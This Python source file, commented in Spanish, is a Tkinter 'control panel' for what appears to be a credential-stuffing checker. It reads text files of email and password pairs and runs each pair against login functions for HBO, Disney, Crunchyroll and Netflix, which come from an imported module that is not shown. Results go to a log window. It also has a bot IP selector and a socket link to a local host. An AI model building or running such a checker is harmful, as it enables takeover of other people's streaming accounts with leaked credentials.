import os
import time
import socket
import threading
import tkinter as tk
from tkinter import ttk
import ConfigStrem as St
from PIL import Image, ImageTk

def BuscarTxt(directorio):
    archivos_txt = []
    for archivo in os.listdir(directorio):
        if archivo.endswith(".txt"):
           archivos_txt.append(archivo)
    return archivos_txt

def BuscarIp():
    try:
        # Obtener el nombre del host local
        nombre_host = socket.gethostname()
        # Obtener la dirección IP asociada con el nombre del host
        direccion_ip = socket.gethostbyname(nombre_host)
        return direccion_ip,'192.168.0.103'
    except socket.error as e:
        print(f"Error al obtener la dirección IP: {e}")
        return None

def ConexionLocal():

    HOST = '192.168.1.10'
    PORT = 65432        

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        while True:
            msg = input("Ingrese plataforma: ")
            data = s.recv(1024)
            msg = data.decode()

            # start_log_thread(msg)

            if msg == "chao":
               break

            s.sendall(bytes(msg, 'utf-8'))
        
    print('Recibido', repr(data))

def Reflejo(msg):
    try:
        RegistroText.insert(tk.END, msg + '\n')
        RegistroText.see(tk.END)  # Desplaza hacia abajo para mostrar la última entrada
        time.sleep(2)
        RegistroText.update()
    except TypeError:
        pass

def Streming(file,streming):
    try:
        is_running = True

        CadenaUsuarios = St.GenCorreo(os.path.join(os.getcwd(),'txt',file),True)

        while is_running:
            Co, Cs = next(CadenaUsuarios)

            if streming == 'Hbo':
                msg = St.Hbo(Co, Cs)
                Reflejo(msg)
            
            if streming == 'Disney':
                msg = St.Disney(Co, Cs)
                Reflejo(msg)

            if streming == 'Crunchyroll':
                msg = St.Crunchyroll(Co, Cs)
                Reflejo(msg)
            
            if streming == 'Netflix':
                msg = St.Netflix(Co, Cs)
                Reflejo(msg)

            # if streming == 'NKookies':
            #     msg = St.Main(Co,Cs)

    except StopIteration:
        print('[+] Finalizo la busqueda de credenciales')
        # Establecer la bandera como falsa para indicar que el hilo ha terminado

def HabilitarRegistro():
    RegistroText.config(state=tk.NORMAL)

def start_log_thread():
    is_running = False
    if not is_running:
        log_thread = threading.Thread(target=Streming(archivo.get(),plataforma.get()))
        log_thread.start()

def run():
    log_thread = threading.Thread(target=start_log_thread)
    log_thread.start()

root = tk.Tk()
root.title("PANEL DE CONTROL") 
root.geometry("415x500")
root.resizable(False, False)
root.configure(bg="lightblue")

img = ImageTk.PhotoImage(Image.open(r"imagen.png"))  
label_img = tk.Label(image=img)
label_img.place(x=20, y=20)

files = BuscarTxt(os.path.join(os.getcwd(),'txt'))
archivo = ttk.Combobox(root,height=100,width = 30,justify='center' )
archivo["values"] = tuple(files)

try:
    archivo.current(0) 
    archivo.place(x=205, y=110) 

except Exception:
    MSG = '''No Hay Archivos TXT en el diretorio
    Cuando hay archivos aparesera la
    configuracion cerra la app iniciar 
    de nuevo '''
    
    Advertencia = tk.Label(text=MSG)
    Advertencia.place(x=205, y=100)
    
plataforma = ttk.Combobox(root,height=100,width = 30,justify='center' )
plataforma["values"] = ("Hbo","NKookies","Crunchyroll", "Disney",'Netflix') 
plataforma.current(0) 
plataforma.place(x=200, y=30)

ips = BuscarIp()
bots = ttk.Combobox(root,height=100,width = 30,justify='center' )
bots["values"] = ips
bots.current(0) 
bots.place(x=202, y=70)

BtnRegistro = tk.Button(root, text="iniciar", command=run)
BtnRegistro.place(x=280, y=160)

RegistroText = tk.Text(root,height=15, width=45)
RegistroText.place(x=25, y=230)

root.mainloop()